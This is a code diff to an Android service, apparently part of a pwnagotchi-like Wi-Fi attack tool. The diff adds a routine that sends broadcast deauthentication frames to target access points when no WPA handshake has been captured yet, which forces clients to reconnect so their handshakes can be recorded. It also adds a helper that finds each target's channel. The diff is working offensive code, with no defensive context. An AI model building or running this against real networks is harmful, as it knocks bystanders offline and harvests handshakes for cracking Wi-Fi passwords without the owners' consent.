@@ -231,6 +231,14 @@ public class PwngService extends Service {
                 totalHandshakes++;
                 success = true;
                 brain.currentStatus = "💀 handshake! " + d.targetSsid;
+            } else {
+                // No handshake yet — random deauth to force reconnection
+                if (rng.nextInt(100) < 30 && d.targetBssid != null) {  // 30% chance
+                    String ch = getChanForBssid(d.targetBssid, scanData);
+                    int chan = ch != null ? Integer.parseInt(ch) : 6;
+                    monitor.deauth(d.targetBssid, "ff:ff:ff:ff:ff:ff", chan);
+                    brain.currentStatus = "👊 deauth " + d.targetSsid;
+                }
             }
         }
         
@@ -575,4 +583,11 @@ public class PwngService extends Service {
     }
 
     private void sleep(long ms) { try { Thread.sleep(ms); } catch (Exception e) {} }
+    
+    private String getChanForBssid(String bssid, List<String[]> scanData) {
+        for (String[] ap : scanData) {
+            if (ap[0].equals(bssid)) return ap[2];
+        }
+        return null;
+    }
 }
